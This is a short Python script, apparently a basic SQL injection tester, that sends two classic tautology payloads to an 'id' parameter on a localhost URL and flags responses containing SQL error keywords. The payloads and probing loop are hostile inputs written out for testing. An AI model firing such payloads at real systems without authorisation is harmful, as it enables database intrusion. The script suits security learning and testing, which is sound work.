import requests

# Target URL (needs a query param you can play with)
url = "http://localhost:5000/user?id="

# Just a couple of classic payloads
payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1"
]

for p in payloads:
    full_url = url + p
    r = requests.get(full_url)

    print(f"\nTesting: {full_url}")
    print("Status:", r.status_code)

    # Simple check: look for SQL error keywords in the response
    if any(err in r.text.lower() for err in ["sql", "syntax", "odbc", "mysql", "sqlite", "error"]):
        print("[!] Possible injection vulnerability detected!")
    else:
        print("[-] No obvious issue.")
